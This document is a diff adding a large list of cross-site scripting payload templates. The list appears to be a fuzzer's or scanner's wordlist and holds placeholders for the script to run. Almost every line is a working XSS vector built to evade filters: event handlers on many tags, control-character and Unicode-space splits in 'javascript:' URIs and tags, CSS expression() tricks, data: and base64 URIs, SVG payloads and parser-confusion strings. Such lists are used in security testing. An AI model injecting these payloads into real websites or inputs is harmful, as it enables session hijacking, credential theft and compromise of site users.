@@ -1,0 +1,527 @@
+<script\x20type="text/javascript">%(eval_payload)s;</script>
+<script\x3Etype="text/javascript">%(eval_payload)s;</script>
+<script\x0Dtype="text/javascript">%(eval_payload)s;</script>
+<script\x09type="text/javascript">%(eval_payload)s;</script>
+<script\x0Ctype="text/javascript">%(eval_payload)s;</script>
+<script\x2Ftype="text/javascript">%(eval_payload)s;</script>
+<script\x0Atype="text/javascript">%(eval_payload)s;</script>
+'`"><\x3Cscript>%(eval_payload)s</script>
+'`"><\x00script>%(eval_payload)s</script>
+<img src=1 href=1 onerror="%(eval_payload)s"></img>
+<audio src=1 href=1 onerror="%(eval_payload)s"></audio>
+<video src=1 href=1 onerror="%(eval_payload)s"></video>
+<body src=1 href=1 onerror="%(eval_payload)s"></body>
+<image src=1 href=1 onerror="%(eval_payload)s"></image>
+<object src=1 href=1 onerror="%(eval_payload)s"></object>
+<script src=1 href=1 onerror="%(eval_payload)s"></script>
+<svg onResize svg onResize="javascript:%(eval_payload)s"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:%(eval_payload)s"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:%(eval_payload)s"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:%(eval_payload)s"></body onMouseEnter>
+<body onFocus body onFocus="javascript:%(eval_payload)s"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:%(eval_payload)s"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:%(eval_payload)s"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:%(eval_payload)s"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:%(eval_payload)s"></body onPropertyChange>
+<svg onLoad svg onLoad="javascript:%(eval_payload)s"></svg onLoad>
+<body onPageHide body onPageHide="javascript:%(eval_payload)s"></body onPageHide>
+<body onMouseOver body onMouseOver="javascript:%(eval_payload)s"></body onMouseOver>
+<body onUnload body onUnload="javascript:%(eval_payload)s"></body onUnload>
+<body onLoad body onLoad="javascript:%(eval_payload)s"></body onLoad>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:%(eval_payload)s"></bgsound onPropertyChange>
+<html onMouseLeave html onMouseLeave="javascript:%(eval_payload)s"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:%(eval_payload)s"></html onMouseWheel>
+<style onLoad style onLoad="javascript:%(eval_payload)s"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:%(eval_payload)s"></iframe onReadyStateChange>
+<body onPageShow body onPageShow="javascript:%(eval_payload)s"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:%(eval_payload)s"></style onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:%(eval_payload)s"></frameset onFocus>
+<applet onError applet onError="javascript:%(eval_payload)s"></applet onError>
+<marquee onStart marquee onStart="javascript:%(eval_payload)s"></marquee onStart>
+<script onLoad script onLoad="javascript:%(eval_payload)s"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:%(eval_payload)s"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.%(eval_payload)s"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload="javascript:%(eval_payload)s"></body onBeforeUnload>
+<html onMouseDown html onMouseDown="javascript:%(eval_payload)s"></html onMouseDown>
+<marquee onScroll marquee onScroll="javascript:%(eval_payload)s"></marquee onScroll>
+<xml onPropertyChange xml onPropertyChange="javascript:%(eval_payload)s"></xml onPropertyChange>
+<frameset onBlur frameset onBlur="javascript:%(eval_payload)s"></frameset onBlur>
+<applet onReadyStateChange applet onReadyStateChange="javascript:%(eval_payload)s"></applet onReadyStateChange>
+<svg onUnload svg onUnload="javascript:%(eval_payload)s"></svg onUnload>
+<html onMouseOut html onMouseOut="javascript:%(eval_payload)s"></html onMouseOut>
+<body onMouseMove body onMouseMove="javascript:%(eval_payload)s"></body onMouseMove>
+<body onResize body onResize="javascript:%(eval_payload)s"></body onResize>
+<object onError object onError="javascript:%(eval_payload)s"></object onError>
+<body onPopState body onPopState="javascript:%(eval_payload)s"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:%(eval_payload)s"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:%(eval_payload)s"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:%(eval_payload)s"></body onpagehide>
+<svg onunload svg onunload="javascript:%(eval_payload)s"></svg onunload>
+<applet onerror applet onerror="javascript:%(eval_payload)s"></applet onerror>
+<body onkeyup body onkeyup="javascript:%(eval_payload)s"></body onkeyup>
+<body onunload body onunload="javascript:%(eval_payload)s"></body onunload>
+<iframe onload iframe onload="javascript:%(eval_payload)s"></iframe onload>
+<body onload body onload="javascript:%(eval_payload)s"></body onload>
+<html onmouseover html onmouseover="javascript:%(eval_payload)s"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:%(eval_payload)s"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:%(eval_payload)s"></body onbeforeunload>
+<body onfocus body onfocus="javascript:%(eval_payload)s"></body onfocus>
+<body onkeydown body onkeydown="javascript:%(eval_payload)s"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:%(eval_payload)s"></iframe onbeforeload>
+<iframe src iframe src="javascript:%(eval_payload)s"></iframe src>
+<svg onload svg onload="javascript:%(eval_payload)s"></svg onload>
+<html onmousemove html onmousemove="javascript:%(eval_payload)s"></html onmousemove>
+<body onblur body onblur="javascript:%(eval_payload)s"></body onblur>
+\x3Cscript>%(eval_payload)s</script>
+<img src=1 title=x:xx\x0B/onerror=%(eval_payload)s>
+<img src=1 title=x:xx\x20/onerror=%(eval_payload)s>
+<img src=1 title=x:xx\x09/onerror=%(eval_payload)s>
+<img src=1 title=x:xx\x0D/onerror=%(eval_payload)s>
+<img src=1 title=x:xx\x0C/onerror=%(eval_payload)s>
+<img src=1 title=x:xx\x0A/onerror=%(eval_payload)s>
+'"`><script>/* *\x2F%(eval_payload)s// */</script>
+<script>%(eval_payload)s</script\x0D
+<script>%(eval_payload)s</script\x0A
+<script>%(eval_payload)s</script\x0B
+<script charset="\x22>%(eval_payload)s</script>
+<!--\x3E<img src=xxx:x onerror=%(eval_payload)s> -->
+--><!-- ---> <img src=xxx:x onerror=%(eval_payload)s> -->
+--><!-- --\x00> <img src=xxx:x onerror=%(eval_payload)s> -->
+--><!-- --\x21> <img src=xxx:x onerror=%(eval_payload)s> -->
+--><!-- --\x3E> <img src=xxx:x onerror=%(eval_payload)s> -->
+`"'><img src='#\x27 onerror=%(eval_payload)s>
+<a href="javascript\x3A%(eval_payload)s" id="fuzzelement1">test</a>
+"'`><p><svg><script>a='hello\x27;%(eval_payload)s//';</script></p>
+<a href="javas\x00cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x07cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x08cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x02cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x03cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x04cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x01cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x05cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x09cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x06cript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:%(eval_payload)s" id="fuzzelement1">test</a>
+<script>/* *\x2A/%(eval_payload)s// */</script>
+<script>/* *\x00/%(eval_payload)s// */</script>
+<style></style\x3E<img src="about:blank" onerror=%(eval_payload)s//></style>
+<style></style\x0D<img src="about:blank" onerror=%(eval_payload)s//></style>
+<style></style\x09<img src="about:blank" onerror=%(eval_payload)s//></style>
+<style></style\x20<img src="about:blank" onerror=%(eval_payload)s//></style>
+<style></style\x0A<img src="about:blank" onerror=%(eval_payload)s//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(%(eval_payload)s;/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(%(eval_payload)s;/*';">DEF
+<script>if("x\\xE1\x96\x89".length==2) { %(eval_payload)s;}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { %(eval_payload)s;}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { %(eval_payload)s;}</script>
+'`"><\x3Cscript>%(eval_payload)s</script>
+'`"><\x00script>%(eval_payload)s</script>
+"'`><\x3Cimg src=xxx:x onerror=%(eval_payload)s>
+"'`><\x00img src=xxx:x onerror=%(eval_payload)s>
+<script src="data:text/plain\x2C%(eval_payload)s"></script>
+<script src="data:\xD4\x8F,%(eval_payload)s"></script>
+<script src="data:\xE0\xA4\x98,%(eval_payload)s"></script>
+<script src="data:\xCB\x8F,%(eval_payload)s"></script>
+<script\x20type="text/javascript">%(eval_payload)s;</script>
+<script\x3Etype="text/javascript">%(eval_payload)s;</script>
+<script\x0Dtype="text/javascript">%(eval_payload)s;</script>
+<script\x09type="text/javascript">%(eval_payload)s;</script>
+<script\x0Ctype="text/javascript">%(eval_payload)s;</script>
+<script\x2Ftype="text/javascript">%(eval_payload)s;</script>
+<script\x0Atype="text/javascript">%(eval_payload)s;</script>
+ABC<div style="x\x3Aexpression(%(eval_payload)s">DEF
+ABC<div style="x:expression\x5C(%(eval_payload)s">DEF
+ABC<div style="x:expression\x00(%(eval_payload)s">DEF
+ABC<div style="x:exp\x00ression(%(eval_payload)s">DEF
+ABC<div style="x:exp\x5Cression(%(eval_payload)s">DEF
+ABC<div style="x:\x0Aexpression(%(eval_payload)s">DEF
+ABC<div style="x:\x09expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE3\x80\x80expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x84expression(%(eval_payload)s">DEF
+ABC<div style="x:\xC2\xA0expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x80expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(%(eval_payload)s">DEF
+ABC<div style="x:\x0Dexpression(%(eval_payload)s">DEF
+ABC<div style="x:\x0Cexpression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x87expression(%(eval_payload)s">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(%(eval_payload)s">DEF
+ABC<div style="x:\x20expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x88expression(%(eval_payload)s">DEF
+ABC<div style="x:\x00expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x86expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x85expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x82expression(%(eval_payload)s">DEF
+ABC<div style="x:\x0Bexpression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x81expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x83expression(%(eval_payload)s">DEF
+ABC<div style="x:\xE2\x80\x89expression(%(eval_payload)s">DEF
+<a href="\x0Bjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x05javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x18javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x11javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x17javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x03javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x00javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x10javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x20javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x13javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x09javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x14javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x19javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x07javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x04javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x01javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x08javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x12javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x15javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x16javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x02javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x06javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javascript\x00:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javascript\x3A:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javascript\x09:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javascript\x0D:%(eval_payload)s" id="fuzzelement1">test</a>
+<a href="javascript\x0A:%(eval_payload)s" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=%(eval_payload)s>
+`"'><img src=xxx:x \x22onerror=%(eval_payload)s>
+`"'><img src=xxx:x \x0Bonerror=%(eval_payload)s>
+`"'><img src=xxx:x \x0Donerror=%(eval_payload)s>
+`"'><img src=xxx:x \x2Fonerror=%(eval_payload)s>
+`"'><img src=xxx:x \x09onerror=%(eval_payload)s>
+`"'><img src=xxx:x \x0Conerror=%(eval_payload)s>
+`"'><img src=xxx:x \x00onerror=%(eval_payload)s>
+`"'><img src=xxx:x \x27onerror=%(eval_payload)s>
+`"'><img src=xxx:x \x20onerror=%(eval_payload)s>
+"`'><script>\x3B%(eval_payload)s</script>
+"`'><script>\x0D%(eval_payload)s</script>
+"`'><script>\xEF\xBB\xBF%(eval_payload)s</script>
+"`'><script>\xE2\x80\x81%(eval_payload)s</script>
+"`'><script>\xE2\x80\x84%(eval_payload)s</script>
+"`'><script>\xE3\x80\x80%(eval_payload)s</script>
+"`'><script>\x09%(eval_payload)s</script>
+"`'><script>\xE2\x80\x89%(eval_payload)s</script>
+"`'><script>\xE2\x80\x85%(eval_payload)s</script>
+"`'><script>\xE2\x80\x88%(eval_payload)s</script>
+"`'><script>\x00%(eval_payload)s</script>
+"`'><script>\xE2\x80\xA8%(eval_payload)s</script>
+"`'><script>\xE2\x80\x8A%(eval_payload)s</script>
+"`'><script>\xE1\x9A\x80%(eval_payload)s</script>
+"`'><script>\x0C%(eval_payload)s</script>
+"`'><script>\x2B%(eval_payload)s</script>
+"`'><script>\xF0\x90\x96\x9A%(eval_payload)s</script>
+"`'><script>-%(eval_payload)s</script>
+"`'><script>\x0A%(eval_payload)s</script>
+"`'><script>\xE2\x80\xAF%(eval_payload)s</script>
+"`'><script>\x7E%(eval_payload)s</script>
+"`'><script>\xE2\x80\x87%(eval_payload)s</script>
+"`'><script>\xE2\x81\x9F%(eval_payload)s</script>
+"`'><script>\xE2\x80\xA9%(eval_payload)s</script>
+"`'><script>\xC2\x85%(eval_payload)s</script>
+"`'><script>\xEF\xBF\xAE%(eval_payload)s</script>
+"`'><script>\xE2\x80\x83%(eval_payload)s</script>
+"`'><script>\xE2\x80\x8B%(eval_payload)s</script>
+"`'><script>\xEF\xBF\xBE%(eval_payload)s</script>
+"`'><script>\xE2\x80\x80%(eval_payload)s</script>
+"`'><script>\x21%(eval_payload)s</script>
+"`'><script>\xE2\x80\x82%(eval_payload)s</script>
+"`'><script>\xE2\x80\x86%(eval_payload)s</script>
+"`'><script>\xE1\xA0\x8E%(eval_payload)s</script>
+"`'><script>\x0B%(eval_payload)s</script>
+"`'><script>\x20%(eval_payload)s</script>
+"`'><script>\xC2\xA0%(eval_payload)s</script>
+"/><img/onerror=\x0B%(eval_payload)s\x0Bsrc=xxx:x />
+"/><img/onerror=\x22%(eval_payload)s\x22src=xxx:x />
+"/><img/onerror=\x09%(eval_payload)s\x09src=xxx:x />
+"/><img/onerror=\x27%(eval_payload)s\x27src=xxx:x />
+"/><img/onerror=\x0A%(eval_payload)s\x0Asrc=xxx:x />
+"/><img/onerror=\x0C%(eval_payload)s\x0Csrc=xxx:x />
+"/><img/onerror=\x0D%(eval_payload)s\x0Dsrc=xxx:x />
+"/><img/onerror=\x60%(eval_payload)s\x60src=xxx:x />
+"/><img/onerror=\x20%(eval_payload)s\x20src=xxx:x />
+<script\x2F>%(eval_payload)s</script>
+<script\x20>%(eval_payload)s</script>
+<script\x0D>%(eval_payload)s</script>
+<script\x0A>%(eval_payload)s</script>
+<script\x0C>%(eval_payload)s</script>
+<script\x00>%(eval_payload)s</script>
+<script\x09>%(eval_payload)s</script>
+`"'><img src=xxx:x onerror\x0B=%(eval_payload)s>
+`"'><img src=xxx:x onerror\x00=%(eval_payload)s>
+`"'><img src=xxx:x onerror\x0C=%(eval_payload)s>
+`"'><img src=xxx:x onerror\x0D=%(eval_payload)s>
+`"'><img src=xxx:x onerror\x20=%(eval_payload)s>
+`"'><img src=xxx:x onerror\x0A=%(eval_payload)s>
+`"'><img src=xxx:x onerror\x09=%(eval_payload)s>
+<script>%(eval_payload)s<\x00/script>
+<img src=# onerror\x3D"%(eval_payload)s" >
+<form id="test" /><button form="test" formaction="javascript:%(eval_payload)s">X
+<input onfocus=%(eval_payload)s autofocus>
+<input onblur=%(eval_payload)s autofocus><input autofocus>
+<video poster=javascript:%(eval_payload)s//
+<body onscroll=%(eval_payload)s><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=%(eval_payload)s><input></form><button form=test onformchange=%(eval_payload)s>X
+<video><source onerror="javascript:%(eval_payload)s">
+<video onerror="javascript:%(eval_payload)s"><source>
+<form><button formaction="javascript:%(eval_payload)s">X
+<body oninput=%(eval_payload)s><input autofocus>
+<math href="javascript:%(eval_payload)s">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:%(eval_payload)s">CLICKME</maction> </math>
+<frameset onload=%(eval_payload)s>
+<table background="javascript:%(eval_payload)s">
+<!--<img src="--><img src=x onerror=%(eval_payload)s//">
+<comment><img src="</comment><img src=x onerror=%(eval_payload)s)//">
+<![><img src="]><img src=x onerror=%(eval_payload)s//">
+<style><img src="</style><img src=x onerror=%(eval_payload)s//">
+<li style=list-style:url() onerror=%(eval_payload)s> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=%(eval_payload)s></div>
+<head><base href="javascript://"></head><body><a href="/. /,%(eval_payload)s//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>%(eval_payload)s</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:%(eval_payload)s"></OBJECT>
+<object data="data:text/html;base64,%(base64)s">
+<embed src="data:text/html;base64,%(base64)s">
+<b <script>%(jscript)s</script>0
+<div id="div1"><input value="``onmouseover=%(eval_payload)s"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=%(eval_payload)s//'>
+<embed src="%(eval_payload)s">
+<img src="%(eval_payload)s">
+<image src="%(eval_payload)s">
+<script src="%(eval_payload)s">
+<div style=width:1px;filter:glow onfilterchange=%(eval_payload)s>x
+<object allowscriptaccess="always" data="%(swf)s"></object>
+<? foo="><script>%(eval_payload)s</script>">
+<! foo="><script>%(eval_payload)s</script>">
+</ foo="><script>%(eval_payload)s</script>">
+<? foo="><x foo='?><script>%(eval_payload)s</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>%(eval_payload)s</script>">
+<% foo><x foo="%><script>%(eval_payload)s</script>">
+<html> <body> <b>some content without two new line \n\n</b> Content-Type: multipart/related; boundary="******"<b>some content without two new line</b> --****** Content-Location: xss.html Content-Transfer-Encoding: base64  %(base64)s --******-- </body> </html>
+<div id=d><x xmlns="><iframe onload=%(eval_payload)s"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x00src=x onerror="%(eval_payload)s">
+<img \x47src=x onerror="%(eval_payload)s">
+<img \x11src=x onerror="%(eval_payload)s">
+<img \x12src=x onerror="%(eval_payload)s">
+<img\x47src=x onerror="%(eval_payload)s">
+<img\x10src=x onerror="%(eval_payload)s">
+<img\x13src=x onerror="%(eval_payload)s">
+<img\x32src=x onerror="%(eval_payload)s">
+<img\x47src=x onerror="%(eval_payload)s">
+<img\x11src=x onerror="%(eval_payload)s">
+<img \x47src=x onerror="%(eval_payload)s">
+<img \x34src=x onerror="%(eval_payload)s">
+<img \x39src=x onerror="%(eval_payload)s">
+<img \x00src=x onerror="%(eval_payload)s">
+<img src\x09=x onerror="%(eval_payload)s">
+<img src\x10=x onerror="%(eval_payload)s">
+<img src\x13=x onerror="%(eval_payload)s">
+<img src\x32=x onerror="%(eval_payload)s">
+<img src\x12=x onerror="%(eval_payload)s">
+<img src\x11=x onerror="%(eval_payload)s">
+<img src\x00=x onerror="%(eval_payload)s">
+<img src\x47=x onerror="%(eval_payload)s">
+<img src=x\x09onerror="%(eval_payload)s">
+<img src=x\x10onerror="%(eval_payload)s">
+<img src=x\x11onerror="%(eval_payload)s">
+<img src=x\x12onerror="%(eval_payload)s">
+<img src=x\x13onerror="%(eval_payload)s">
+<img src=x\x32onerror="%(eval_payload)s">
+<img src=x onerror=\x09"%(eval_payload)s">
+<img src=x onerror=\x10"%(eval_payload)s">
+<img src=x onerror=\x11"%(eval_payload)s">
+<img src=x onerror=\x12"%(eval_payload)s">
+<img src=x onerror=\x32"%(eval_payload)s">
+<img src=x onerror=\x00"%(eval_payload)s">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:%(eval_payload)s>XXX</a>
+<img src="x` `<script>%(eval_payload)s</script>"` `>
+<img src onerror /" '"= alt=%(eval_payload)s//">
+<title onpropertychange=%(eval_payload)s></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=%(eval_payload)s></a>">
+<!--[if]><script>%(eval_payload)s</script -->
+<!--[if<img src=x onerror=%(eval_payload)s//]> -->
+<script src="/\%(jscript)s"></script>
+<script src="\\%(jscript)s"></script>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="%(eval_payload)s" style="behavior:url(#x);"><param name=postdomevents /></object>
+<a style="-o-link:'javascript:%(eval_payload)s';-o-link-source:current">X
+<style>p[foo=bar{}*{-o-link:'javascript:%(eval_payload)s'}{}*{-o-link-source:current}]{color:red};</style>
+<link rel=stylesheet href=data:,*%7bx:expression(%(eval_payload)s)%7d
+<style>@import "data:,*%7bx:expression(%(eval_payload)s)%7D";</style>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="%(eval_payload)s;">XXX</a></a><a href="javascript:%(eval_payload)s">XXX</a>
+<style>*[{}@import'%(css)s?]</style>X
+<div style="font-family:'foo&#10;;color:red;';">XXX
+<div style="font-family:foo}color=red;">XXX
+<a x="javasc&#x0Aript:%(eval_payload)s" style="\000062\00065\68\0\00 \&#xA0\000061 vio\r:url\28#default#time2);\-\ \ \00006D\0006f\7A\2d \62	\000069 \06E din\g:url(%(xbl)s#xss);\-\00006F\0002d\6C \69 \6e	\00006B:attr(x);\-\00006F\0002d\6C \69 \6e	\00006B-s\ource:current" end=0 onend=%(eval_payload)s>XXX
+<// style=x:expression\28%(eval_payload)s\29>
+<style>*{x:??????????(%(eval_payload)s)}</style>
+<div style=content:url(%(svg)s)></div>
+<!DOCTYPE> <div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X
+<div style="list-style:url(http://foo.f)\20url(javascript:%(eval_payload)s);">X
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+XXX<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<script>({set/**/$($){_/**/setter=$,_=%(eval_payload)s}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(%(eval_payload)s)})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){%(eval_payload)s}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('%(eval_payload)s')()</script>
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
+<script src="#">{%(eval_payload)s}</script>;1
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),%(eval_payload)s;
+<b><script<b></b><%(eval_payload)s</script </b>
+<script<{%(eval_payload)s}/></script </>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,%(b64)s'))
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'%(eval_payload)s',384,null,'rsa-dual-use')</script>
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){eval(arguments[0])}),'b':['%(eval_payload)s']}]</script>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:%(eval_payload)s"></g></svg>
+<?xml version="1.0" standalone="no"?> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <style type="text/css"> @font-face {font-family: y; src: url("%(svg2)s#x") format("svg");} body {font: 100px "y";} </style> </head> <body>Hello</body> </html>
+<svg xmlns="http://www.w3.org/2000/svg"><script>%(eval_payload)s</script></svg>
+<svg onload="javascript:%(eval_payload)s" xmlns="http://www.w3.org/2000/svg"></svg>
+<svg xmlns="http://www.w3.org/2000/svg"> <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:%(eval_payload)s"><rect width="1000" height="1000" fill="white"/></a> </svg>
